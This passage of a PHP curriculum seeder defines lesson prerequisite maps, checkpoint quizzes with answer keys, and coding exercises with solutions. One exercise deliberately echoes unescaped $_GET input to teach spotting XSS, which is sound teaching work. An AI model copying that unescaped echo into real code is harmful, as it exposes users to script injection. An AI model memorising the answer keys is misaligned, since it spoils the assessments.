                        ['After the course ends, the practice continues', 'Keep building Level 6–7 projects — depth comes from owning systems through their boring middle, not from the first 80%. Re-do old checkpoints after long gaps (the forgetting curve is real), keep the interview bank in rotation, and revisit lessons where your explain-back was weakest. The curriculum finished; the loop — build, break, explain — is the career.'],
                        ['Practice it out loud', 'Record a 3-minute explain-back of one weak topic today, listen to it, and mark every place you said "um" instead of a precise term.'],
                        ['Interview drill', 'Explain HTTP sessions to a junior in three sentences a non-developer would follow — then answer: what would break if the session cookie were readable by JavaScript?'],
                    ],
                ),
            ],
        ];
    }

    /** @return array<string, list<string>> */
    private function prerequisiteMap(): array
    {
        return [
            'A1' => ['A0'],
            'A2' => ['A1'],
            'A3' => ['A2'],
            'A4' => ['A3'],
            'B1' => ['A4'],
            'B2' => ['B1'],
            'B3' => ['B2'],
            'C1' => ['B3'],
            'C2' => ['C1'],
            'C3' => ['C2'],
            'D1' => ['C3'],
            'D2' => ['D1'],
            'E1' => ['D2'],
            'E2' => ['E1'],
            'E3' => ['E2'],
            'F1' => ['E3'],
            'F2' => ['F1'],
            'F3' => ['F2'],
            'F4' => ['F3'],
            'F5' => ['F4'],
            'G1' => ['F5'],
            'G2' => ['G1'],
            'G3' => ['G2'],
            'H1' => ['G3'],
            'H2' => ['H1'],
            'H3' => ['H2'],
            'I1' => ['H3'],
            'I2' => ['I1'],
            'J1' => ['I2'],
            'J2' => ['J1'],
            'K1' => ['J2'],
            'K2' => ['K1'],
            'K3' => ['K2'],
            'K4' => ['K3'],
            'L1' => ['K4'],
            'L2' => ['L1'],
            'L3' => ['L2'],
            'L4' => ['L3'],
            'M1' => ['L4'],
            'M2' => ['M1'],
            'M3' => ['M2'],
            'N1' => ['M3'],
            'N2' => ['N1'],
            'N3' => ['N2'],
            'N4' => ['N3'],
            'N5' => ['N4'],
            'N6' => ['N5'],
            'O1' => ['N6'],
            'O2' => ['O1'],
            'O3' => ['O2'],
            'P1' => ['O3'],
            'P2' => ['P1'],
        ];
    }

    /**
     * Lateral knowledge-graph edges (beyond the linear prerequisite chain).
     *
     * @return array<string, list<string>>
     */
    private function relatedMap(): array
    {
        return [
            'A0' => ['A1', 'A2', 'H1'],
            'A1' => ['A0', 'A2', 'G1'],
            'A2' => ['A0', 'A3', 'B1'],
            'A3' => ['A4', 'E1', 'B1'],
            'A4' => ['A3', 'E2', 'N2'],
            'B1' => ['A2', 'B3', 'C1'],
            'B2' => ['B1', 'B3', 'E3'],
            'B3' => ['B1', 'B2', 'C1'],
            'C1' => ['B3', 'C2', 'E2'],
            'C2' => ['C1', 'C3', 'N2'],
            'C3' => ['C2', 'E2', 'D1'],
            'D1' => ['C3', 'D2', 'A3'],
            'D2' => ['D1', 'E1', 'G1'],
            'E1' => ['D2', 'E2', 'A3'],
            'E2' => ['E1', 'E3', 'N2'],
            'E3' => ['E2', 'B2', 'F1'],
            'F1' => ['E3', 'F2', 'N2'],
            'F2' => ['F1', 'F4', 'N3'],
            'F3' => ['F2', 'F4', 'F5'],
            'F4' => ['F3', 'N1', 'N3'],
            'F5' => ['F4', 'N1', 'A4'],
            'G1' => ['A1', 'G2', 'D2'],
            'G2' => ['G1', 'G3', 'O3'],
            'G3' => ['G2', 'H1', 'O2'],
            'H1' => ['A0', 'H2', 'G3'],
            'H2' => ['H1', 'H3', 'C3'],
            'H3' => ['H2', 'I1', 'O1'],
            'I1' => ['H3', 'I2', 'M2'],
            'I2' => ['I1', 'M2', 'J2'],
            'J1' => ['I2', 'J2', 'N3'],
            'J2' => ['J1', 'K1', 'F4'],
            'K1' => ['J2', 'K2', 'L1'],
            'K2' => ['K1', 'K3', 'M2'],
            'K3' => ['K2', 'L1', 'L4'],
            'K4' => ['K2', 'K3', 'N1'],
            'L1' => ['K3', 'L2', 'L4'],
            'L2' => ['L1', 'L3', 'F4'],
            'L3' => ['L2', 'L4', 'O2'],
            'L4' => ['L3', 'M1', 'K3'],
            'M1' => ['L4', 'M2', 'N2'],
            'M2' => ['M1', 'I2', 'O3'],
            'M3' => ['M2', 'J2', 'N3'],
            'N1' => ['F4', 'N2', 'M1'],
            'N2' => ['N1', 'N3', 'F1'],
            'N3' => ['N2', 'J1', 'F2'],
            'N4' => ['N3', 'F4', 'O1'],
            'N5' => ['N4', 'N1', 'F4'],
            'N6' => ['N5', 'M1', 'N2'],
            'O1' => ['N6', 'O2', 'H3'],
            'O2' => ['O1', 'O3', 'M2'],
            'O3' => ['O2', 'P1', 'G2'],
            'P1' => ['O3', 'P2', 'L2'],
            'P2' => ['P1', 'O1', 'C3'],
        ];
    }

    /**
     * @param  array<string, Lesson>  $lessons
     * @param  array<string, list<string>>  $map
     */
    private function syncRelated(array $lessons, array $map): void
    {
        foreach ($map as $code => $relatedCodes) {
            if (! isset($lessons[$code])) {
                continue;
            }

            $meta = $lessons[$code]->metadata ?? [];
            $meta['related'] = array_values(array_intersect($relatedCodes, array_keys($lessons)));
            $lessons[$code]->metadata = $meta;
            $lessons[$code]->save();
        }
    }

    /** @return array<string, list<array<string, mixed>>> */
    private function checkpointBlueprints(): array
    {
        return [
            'A0' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'A program on disk becomes a ___ when it is loaded and running.', 'options' => ['process', 'compiler', 'opcode', 'thread'], 'answer' => 'process'],
                ['id' => 'q2', 'type' => 'mcq', 'prompt' => 'Which best describes PHP in modern 8.x production setups?', 'options' => ['Source is parsed to opcodes, then executed (often with opcache)', 'Every line is re-read from disk as English on each run', 'It is only a markup language', 'It never uses memory'], 'answer' => 'Source is parsed to opcodes, then executed (often with opcache)'],
                ['id' => 'q3', 'type' => 'text', 'prompt' => 'CLI PHP and Web PHP use the same language. What short term describes the bridge to Apache/Nginx or the terminal?', 'answer' => 'SAPI', 'keywords' => ['sapi', 'server api']],
                ['id' => 'q4', 'type' => 'text', 'prompt' => 'Name one place where variables live while a PHP script is running.', 'answer' => 'memory', 'keywords' => ['ram', 'memory', 'heap', 'stack']],
            ],
            'A4' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Inside a function, a variable declared without global is…', 'options' => ['local to the function', 'visible everywhere', 'static forever', 'a constant'], 'answer' => 'local to the function'],
                ['id' => 'q2', 'type' => 'mcq', 'prompt' => 'Which creates a compile-time constant preferred in modern PHP?', 'options' => ['const MAX = 10;', 'define("MAX", 10);', '$MAX = 10;', 'let MAX = 10;'], 'answer' => 'const MAX = 10;'],
                ['id' => 'q3', 'type' => 'text', 'prompt' => 'What keyword makes a function variable persist across calls?', 'answer' => 'static', 'keywords' => ['static']],
            ],
            'B3' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Under strict_types=1, passing a non-int string to an int parameter results in…', 'options' => ['TypeError', 'silent cast to 0', 'true', 'null'], 'answer' => 'TypeError'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Which operator is preferred for value equality without type juggling?', 'answer' => '===', 'keywords' => ['===', 'identical']],
            ],
            'C3' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'A recursive function without a base case will typically hit…', 'options' => ['stack overflow / Error', 'a syntax error', 'a JSON error', 'nothing; it stops alone'], 'answer' => 'stack overflow / Error'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'In one sentence: what is a side effect?', 'answer' => 'changing something outside the function', 'keywords' => ['outside', 'global', 'io', 'state']],
            ],
            'D2' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Copy-on-write means…', 'options' => ['values are shared until one is modified', 'every assignment deep-copies immediately', 'references are disabled', 'objects live on the stack'], 'answer' => 'values are shared until one is modified'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'PHP mostly manages memory with what technique (count of references)?', 'answer' => 'reference counting', 'keywords' => ['refcount', 'reference counting', 'counting']],
            ],
            'E3' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Which flag makes json_encode throw on error?', 'options' => ['JSON_THROW_ON_ERROR', 'JSON_STRICT', 'JSON_THROW', 'JSON_FORCE'], 'answer' => 'JSON_THROW_ON_ERROR'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Safer write pattern: write to temp then ___ to final path.', 'answer' => 'rename', 'keywords' => ['rename', 'atomic']],
            ],
            'F5' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'App\\Models\\User maps under PSR-4 to file…', 'options' => ['app/Models/User.php', 'App/Models/User.php anywhere', 'src/User.php only', 'vendor/User.php'], 'answer' => 'app/Models/User.php'],
                ['id' => 'q2', 'type' => 'mcq', 'prompt' => 'An enum case Role::Admin->value for string-backed enum is…', 'options' => ['the string backing value', 'the case name always', 'an integer', 'null'], 'answer' => 'the string backing value'],
                ['id' => 'q3', 'type' => 'text', 'prompt' => 'readonly properties can be assigned…', 'answer' => 'once', 'keywords' => ['once', 'one time', 'initial']],
            ],
            'G3' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Best practice when catching exceptions around I/O…', 'options' => ['catch specific types and either recover or rethrow with context', 'catch Throwable and ignore', 'never catch anything', 'echo the exception to users'], 'answer' => 'catch specific types and either recover or rethrow with context'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Retryable failures should include which two controls? (timeout and…)', 'answer' => 'backoff', 'keywords' => ['backoff', 'delay', 'retry']],
            ],
            'H3' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'BFS typically uses…', 'options' => ['a queue', 'a stack only', 'recursion only', 'a heap only'], 'answer' => 'a queue'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Big O ignores…', 'answer' => 'constants', 'keywords' => ['constant', 'constants', 'lower order']],
            ],
            'I2' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'A job that may run twice should be designed to be…', 'options' => ['idempotent', 'faster', 'single-threaded always', 'unscheduled'], 'answer' => 'idempotent'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Two transactions updating the same row can cause what (lock conflict)?', 'answer' => 'deadlock', 'keywords' => ['deadlock', 'contention', 'lock']],
            ],
            'J2' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'TDD cycle order is…', 'options' => ['red, green, refactor', 'refactor, red, green', 'green, red, design', 'plan, code, document only'], 'answer' => 'red, green, refactor'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'A working simplified stand-in for a dependency is often called a…', 'answer' => 'fake', 'keywords' => ['fake', 'stub']],
            ],
            'K3' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'N+1 queries means…', 'options' => ['1 query then N more per row in a loop', '11 total queries always', 'an index missing', 'a deadlock'], 'answer' => '1 query then N more per row in a loop'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Which SQL clause filters groups after aggregation?', 'answer' => 'having', 'keywords' => ['having']],
            ],
            'K4' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'An Identity Map mainly prevents…', 'options' => ['duplicate in-memory instances of the same row', 'SQL injection', 'N+1 only', 'deadlocks'], 'answer' => 'duplicate in-memory instances of the same row'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Unit of Work batches insert/update/delete and commits in one…', 'answer' => 'transaction', 'keywords' => ['transaction', 'commit']],
            ],
            'L4' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Creating a resource with POST should normally return…', 'options' => ['201', '204', '500', '100'], 'answer' => '201'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Authn proves identity; authz decides…', 'answer' => 'permissions', 'keywords' => ['permission', 'permissions', 'authorization', 'access']],
            ],
            'M2' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Cache invalidation is hard mainly because…', 'options' => ['stale data must be avoided when sources change', 'caches are always full', 'HTTP forbids caches', 'queues delete cache'], 'answer' => 'stale data must be avoided when sources change'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Command to build optimized config+routes cache in Laravel?', 'answer' => 'optimize', 'keywords' => ['optimize', 'artisan optimize']],
            ],
            'M3' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Semver MINOR version bump means…', 'options' => ['backward-compatible features added', 'breaking change', 'docs only', 'rollback'], 'answer' => 'backward-compatible features added'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Undo a bad local commit that has NOT been pushed?', 'answer' => 'reset', 'keywords' => ['reset', 'git reset', 'soft reset']],
            ],
            'N2' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Constructor injection mainly improves…', 'options' => ['testability and explicit dependencies', 'file size', 'SQL speed', 'HTML output'], 'answer' => 'testability and explicit dependencies'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Laravel resolves type-hinted classes via the…', 'answer' => 'container', 'keywords' => ['container', 'service container', 'ioc']],
            ],
            'N3' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Review priority order in this curriculum is…', 'options' => ['correctness → security → clarity → performance → style', 'style first', 'naming only', 'performance only'], 'answer' => 'correctness → security → clarity → performance → style'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Behavior-preserving small steps are called…', 'answer' => 'refactor', 'keywords' => ['refactor', 'refactoring']],
            ],
            'N6' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'In Laravel, the Front Controller pattern maps primarily to…', 'options' => ['public/index.php + router dispatch', 'a Blade template', 'a queue worker', 'an Eloquent model'], 'answer' => 'public/index.php + router dispatch'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Procedures-per-use-case style with little domain objects is…', 'answer' => 'transaction script', 'keywords' => ['transaction script', 'transactions script']],
            ],
            'O3' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'Before optimizing you should…', 'options' => ['measure and find the hotspot', 'rewrite everything', 'add more servers blindly', 'disable logging'], 'answer' => 'measure and find the hotspot'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'A common first fix for many identical queries in a loop is eager…', 'answer' => 'loading', 'keywords' => ['loading', 'eager', 'with']],
            ],
            'P2' => [
                ['id' => 'q1', 'type' => 'mcq', 'prompt' => 'According to the plan, senior means primarily…', 'options' => ['trade-offs, fundamentals, failure design, communication', 'knowing every API', 'typing speed', 'using only frameworks'], 'answer' => 'trade-offs, fundamentals, failure design, communication'],
                ['id' => 'q2', 'type' => 'text', 'prompt' => 'Explain-it-back grades: correctness, depth, and what third C?', 'answer' => 'clarity', 'keywords' => ['clarity', 'missing']],
            ],
        ];
    }

    /** @return array<string, list<array<string, mixed>>> */
    private function exerciseBlueprints(): array
    {
        return [
            'A0' => [
                ['title' => 'L1 — Program vs Process', 'prompt' => 'In your own words (2–4 sentences): what is the difference between a program on disk and a running process?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'A program is static instructions stored on disk. A process is those instructions loaded into memory and executed by the CPU over time, with its own address space.', 'hints' => 'Think: file vs running app. What disappears when you reboot?', 'order' => 1],
                ['title' => 'L2 — Sum of three numbers', 'prompt' => 'Write PHP that stores three integers, prints their sum, and labels the output.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n\n\$a = 5;\n\$b = 3;\n\$c = 7;\n\n// print the sum with a label\n", 'solution' => "<?php\n\n\$a = 5;\n\$b = 3;\n\$c = 7;\n\necho 'Sum: ' . (\$a + \$b + \$c) . PHP_EOL;\n", 'expected_output' => 'Sum: 15', 'hints' => 'Use echo and the + operator. End output with PHP_EOL.', 'order' => 2],
                ['title' => 'L3 — Debug missing tags', 'prompt' => 'This script prints nothing useful. Diagnose and fix it so it prints Hello.', 'level' => 3, 'type' => 'debug', 'starter_code' => "Hello <?php echo \$name\n", 'solution' => "<?php\n\$name = 'World';\necho 'Hello ' . \$name;\n", 'expected_output' => 'Hello World', 'hints' => 'Is the PHP open tag correct? Is $name defined? Is echo terminated?', 'order' => 3],
                ['title' => 'L4 — Design even/odd checker', 'prompt' => 'Design (bullet steps, no full code required): how would you decide if an integer is even or odd?', 'level' => 4, 'type' => 'design', 'starter_code' => "// 1. ...\n// 2. ...\n// 3. ...\n", 'solution' => "1. Read integer n\n2. Compute n % 2\n3. If remainder is 0 → even, else odd\n4. Print result", 'hints' => 'Modulo operator is your friend.', 'order' => 4],
            ],
            'C3' => [
                ['title' => 'L2 — Refactor script into functions', 'prompt' => 'Take a linear 20-line script idea (parse → compute → print) and outline 4 function signatures with types.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n// function parseInput(...): ...\n// function compute(...): ...\n// function format(...): ...\n// function main(...): void\n", 'solution' => "<?php\nfunction parseInput(array \$argv): array { return \$argv; }\nfunction compute(float \$a, float \$b): float { return \$a + \$b; }\nfunction format(float \$n): string { return number_format(\$n, 2); }\nfunction main(float \$a, float \$b): void { echo format(compute(\$a, \$b)), PHP_EOL; }\n", 'hints' => 'Name by purpose; give parameter and return types.', 'order' => 1],
            ],
            'F4' => [
                ['title' => 'L4 — Refactor inheritance to composition', 'prompt' => 'Design: replace class Admin extends User with role + composed policies. List classes and responsibilities.', 'level' => 4, 'type' => 'design', 'starter_code' => "// User with Role\n// Policy classes\n// ...\n", 'solution' => 'User holds Role enum. AdminPanelAccess checks role. SettingsService depends on AccessPolicy interface — not on Admin subclass. Composition allows multiple roles without diamond inheritance.', 'hints' => 'Think roles as data, permissions as strategy.', 'order' => 1],
            ],
            'H1' => [
                ['title' => 'L1 — Complexity of nested loop', 'prompt' => 'What is O of: for each row, scan all columns?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'O(n*m) ≈ O(n²) if n≈m — quadratic.', 'hints' => 'Multiply loop trip counts.', 'order' => 1],
            ],
            'L3' => [
                ['title' => 'L3 — Spot the XSS', 'prompt' => 'Given echo $_GET["q"] in HTML body — what attack is possible and how does Blade {{ }} prevent it?', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php echo \$_GET['q'];\n", 'solution' => "<?php echo htmlspecialchars(\$_GET['q'], ENT_QUOTES, 'UTF-8');\n// Blade {{ \$q }} escapes similarly", 'hints' => 'Script tags in query string.', 'order' => 1],
            ],
            'P1' => [
                ['title' => 'L6 — Design trade-off defense', 'prompt' => 'You chose Redis over DB cache for session-heavy load. Write 5 bullets: options, criteria, choice, risks, metrics.', 'level' => 6, 'type' => 'design', 'starter_code' => "// options:\n// criteria:\n// choice:\n// risks:\n// metrics:\n", 'solution' => "Options: DB sessions, Redis, signed cookies.\nCriteria: latency, TTL, cluster scale, ops cost.\nChoice: Redis for TTL + speed.\nRisks: cache loss → stampede; extra infra.\nMetrics: p99 auth latency, hit rate, memory.", 'hints' => 'No free lunch — name risks.', 'order' => 1],
            ],
            'A1' => [
                ['title' => 'L2 — First script', 'prompt' => 'Write a PHP CLI script that prints Hello, PHP.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n\n// print Hello, PHP\n", 'solution' => "<?php\necho 'Hello, PHP' . PHP_EOL;\n", 'expected_output' => 'Hello, PHP', 'hints' => 'Open tag, echo, newline.', 'order' => 1],
                ['title' => 'L1 — SAPI vs CLI', 'prompt' => 'What is a SAPI? Why does the CLI SAPI differ from FPM?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'A SAPI is the interface between PHP core and the host (CLI, FPM, Apache module). CLI is for scripts/terminals; FPM is long-running workers for HTTP under a web server.', 'hints' => 'Think: who embeds PHP?', 'order' => 2],
            ],
            'A2' => [
                ['title' => 'L3 — Fix syntax errors', 'prompt' => 'This will not parse. Fix it so it echoes 42.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\necho 42\n", 'solution' => "<?php\necho 42;\n", 'expected_output' => '42', 'hints' => 'Statements end with a semicolon.', 'order' => 1],
                ['title' => 'L2 — Comments and spacing', 'prompt' => 'Write a script with a block comment, a line comment, and one statement.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n\n", 'solution' => "<?php\n/** File purpose */\necho 'ok'; // trailing note\n", 'expected_output' => 'ok', 'hints' => '// and /* */.', 'order' => 2],
            ],
            'A3' => [
                ['title' => 'L1 — Name scalar types', 'prompt' => 'List PHP scalar types and one composite type.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Scalars: int, float, string, bool. Composite: array (also object). null is special.', 'hints' => 'int/float/string/bool.', 'order' => 1],
                ['title' => 'L3 — Type juggling trap', 'prompt' => 'Why is 0 == "abc" true in older comparison? What should you use instead?', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\nvar_export(0 == 'abc');\n", 'solution' => "<?php\nvar_export(0 === (int) 'abc'); // or use ===\n", 'hints' => 'Loose == converts; "abc" becomes 0 as int.', 'order' => 2],
            ],
            'A4' => [
                ['title' => 'L2 — Constants and scope', 'prompt' => 'Define a const APP_NAME and a function that returns it. Call the function.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nconst APP_NAME = 'Demo';\n\nfunction name(): string\n{\n    // return APP_NAME\n}\n\necho name() . PHP_EOL;\n", 'solution' => "<?php\nconst APP_NAME = 'Demo';\nfunction name(): string { return APP_NAME; }\necho name() . PHP_EOL;\n", 'expected_output' => 'Demo', 'hints' => 'const is compile-time; return the constant.', 'order' => 1],
            ],
            'B1' => [
                ['title' => 'L2 — Operator precedence', 'prompt' => 'Compute 2 + 3 * 4 and explain precedence. Then force 20 with parentheses.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n\necho 2 + 3 * 4 . PHP_EOL; // fix grouping\n", 'solution' => "<?php\necho 2 + 3 * 4 . PHP_EOL;  // 14: * first\necho (2 + 3) * 4 . PHP_EOL; // 20\n", 'expected_output' => "14\n20", 'hints' => '* binds tighter than +.', 'order' => 1],
                ['title' => 'L1 — == vs ===', 'prompt' => 'When does == surprise you? Give one example and the strict fix.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => '0 == "foo" is true because non-numeric string casts to 0. Use === to require same type and value.', 'hints' => 'Type juggling.', 'order' => 2],
            ],
            'B2' => [
                ['title' => 'L2 — Safe string build', 'prompt' => 'Build "Total: 15" from an int using interpolation and concatenation.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n\$n = 15;\n// print Total: 15\n", 'solution' => "<?php\n\$n = 15;\necho \"Total: \$n\" . PHP_EOL;\necho 'Total: ' . \$n . PHP_EOL;\n", 'expected_output' => "Total: 15\nTotal: 15", 'hints' => 'Double quotes interpolate; single quotes do not.', 'order' => 1],
                ['title' => 'L3 — Escaping mess', 'prompt' => 'Fix output so it prints: He said "Hi" with a literal $n.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\n\$n = 1;\necho \"He said \\\"Hi\\\" cost \$n\";\n", 'solution' => "<?php\n\$n = 1;\necho 'He said \"Hi\" cost \$n' . PHP_EOL;\n", 'expected_output' => 'He said "Hi" cost $n', 'hints' => 'Single quotes avoid $ interpolation.', 'order' => 2],
            ],
            'B3' => [
                ['title' => 'L3 — Precedence bug', 'prompt' => 'This totals wrong for discounted price. Fix it: price * 1 - 0.1.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\n\$price = 100;\necho \$price * 1 - 0.1; // want 90\n", 'solution' => "<?php\n\$price = 100;\necho \$price * (1 - 0.1);\n", 'expected_output' => '90', 'hints' => 'Parenthesize the discount factor.', 'order' => 1],
            ],
            'C1' => [
                ['title' => 'L2 — Even/odd loop', 'prompt' => 'Loop 1..10 and print only even numbers.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nfor (\$i = 1; \$i <= 10; \$i++) {\n    // print evens\n}\n", 'solution' => "<?php\nfor (\$i = 1; \$i <= 10; \$i++) {\n    if (\$i % 2 === 0) { echo \$i, ' '; }\n}\necho PHP_EOL;\n", 'expected_output' => '2 4 6 8 10', 'hints' => 'Modulo; single space separator.', 'order' => 1],
                ['title' => 'L1 — Branch choice', 'prompt' => 'When is match better than if/elseif chains?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'match is expression-oriented, strict (===), exhaustive, and clearer for single-value dispatch.', 'hints' => 'Expression vs statement.', 'order' => 2],
            ],
            'C2' => [
                ['title' => 'L2 — Typed function', 'prompt' => 'Write area(width: float, height: float): float and call it for 3×4.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nfunction area(float \$width, float \$height): float\n{\n    // return area\n}\n\necho area(3, 4) . PHP_EOL;\n", 'solution' => "<?php\nfunction area(float \$width, float \$height): float\n{\n    return \$width * \$height;\n}\necho area(3, 4) . PHP_EOL;\n", 'expected_output' => '12', 'hints' => 'Multiply dimensions; return type float.', 'order' => 1],
            ],
            'D1' => [
                ['title' => 'L1 — Stack vs heap sketch', 'prompt' => 'In 3 sentences: where do local vars and new objects live in PHP?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Locals live on the call stack frame. Arrays/objects/string buffers live on the heap; the stack holds references/handles. When refs hit zero the GC/RC frees heap memory.', 'hints' => 'Frame vs refcounted values.', 'order' => 1],
            ],
            'D2' => [
                ['title' => 'L5 — Unset and lifetime', 'prompt' => 'What happens to an object after unset($o) if no other references exist?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Refcount drops; when it hits 0 the object is freed immediately (or via GC for cycles). __destruct runs if defined.', 'hints' => 'Reference counting.', 'order' => 1],
            ],
            'E1' => [
                ['title' => 'L2 — Map over array', 'prompt' => 'Given [1,2,3], print each value squared on one line.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n\$nums = [1, 2, 3];\n// print squares\n", 'solution' => "<?php\n\$nums = [1, 2, 3];\nforeach (\$nums as \$n) { echo \$n * \$n, ' '; }\necho PHP_EOL;\n", 'expected_output' => '1 4 9', 'hints' => 'foreach + multiply.', 'order' => 1],
                ['title' => 'L3 — Wrong key type', 'prompt' => 'Fix: $a[1] vs $a["1"] confusion when reading config keys.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\n\$a = ['1' => 'one'];\necho \$a[1] ?? 'missing';\n", 'solution' => "<?php\n\$a = ['1' => 'one'];\necho \$a['1'] ?? 'missing'; // or cast consistently\n", 'expected_output' => 'one', 'hints' => 'Array keys: numeric strings cast to int.', 'order' => 2],
            ],
            'E2' => [
                ['title' => 'L2 — Closure over count', 'prompt' => 'Write a closure that takes an array and returns its count. Call it.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n\$count = function (array \$items): int {\n    // ...\n};\necho \$count([1, 2]) . PHP_EOL;\n", 'solution' => "<?php\n\$count = function (array \$items): int { return count(\$items); };\necho \$count([1, 2]) . PHP_EOL;\n", 'expected_output' => '2', 'hints' => 'return count($items).', 'order' => 1],
                ['title' => 'L4 — Arrow fn use', 'prompt' => 'Rewrite as fn(): array_map(fn(int \$n): int => \$n * 2, $nums).', 'level' => 4, 'type' => 'design', 'starter_code' => "<?php\n\$nums = [1, 2];\n// map with arrow fn\n", 'solution' => "<?php\n\$nums = [1, 2];\nprint_r(array_map(fn(int \$n): int => \$n * 2, \$nums));\n", 'hints' => 'fn(...) => expression.', 'order' => 2],
            ],
            'E3' => [
                ['title' => 'L2 — Write JSON file', 'prompt' => 'Write ["a"=>1] to /tmp/x.json (or sys temp) with file_put_contents and read it back.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n\$path = sys_get_temp_dir() . '/x.json';\n// encode, write, read, decode\n", 'solution' => "<?php\n\$path = sys_get_temp_dir() . '/x.json';\nfile_put_contents(\$path, json_encode(['a' => 1]));\n\$back = json_decode(file_get_contents(\$path), true);\nvar_export(\$back);\n", 'hints' => 'json_encode / file_put_contents / json_decode.', 'order' => 1],
            ],
            'F1' => [
                ['title' => 'L2 — Minimal class', 'prompt' => 'Create class Counter with public int $n = 0 and method bump(): void that increments. Use it.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nclass Counter\n{\n    public int \$n = 0;\n\n    public function bump(): void\n    {\n        // ...\n    }\n}\n\n\$c = new Counter();\n\$c->bump();\necho \$c->n;\n", 'solution' => "<?php\nclass Counter {\n    public int \$n = 0;\n    public function bump(): void { \$this->n++; }\n}\n\$c = new Counter();\n\$c->bump();\necho \$c->n;\n", 'expected_output' => '1', 'hints' => '$this->n++;', 'order' => 1],
            ],
            'F2' => [
                ['title' => 'L4 — Private balance', 'prompt' => 'Design BankAccount with private balance, deposit/withdraw with guard against negative withdraw.', 'level' => 4, 'type' => 'design', 'starter_code' => "<?php\nclass BankAccount\n{\n    private float \$balance = 0.0;\n    // deposit / withdraw\n}\n", 'solution' => "<?php\nclass BankAccount {\n    private float \$balance = 0.0;\n    public function deposit(float \$a): void { if (\$a > 0) \$this->balance += \$a; }\n    public function withdraw(float \$a): bool { if (\$a > \$this->balance || \$a <= 0) return false; \$this->balance -= \$a; return true; }\n    public function balance(): float { return \$this->balance; }\n}\n", 'hints' => 'Invariants live with the object.', 'order' => 1],
            ],
            'F3' => [
                ['title' => 'L3 — Broken override', 'prompt' => 'Child method signature must match parent. Fix so Dog::speak works with parent type hint.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\nclass Animal { public function speak(string \$sound): string { return \$sound; } }\nclass Dog extends Animal { public function speak(\$s) { return 'Woof'; } }\n", 'solution' => "<?php\nclass Animal { public function speak(string \$sound): string { return \$sound; } }\nclass Dog extends Animal { public function speak(string \$sound): string { return 'Woof'; } }\n", 'hints' => 'Parameter and return types must be compatible.', 'order' => 1],
            ],
            'F5' => [
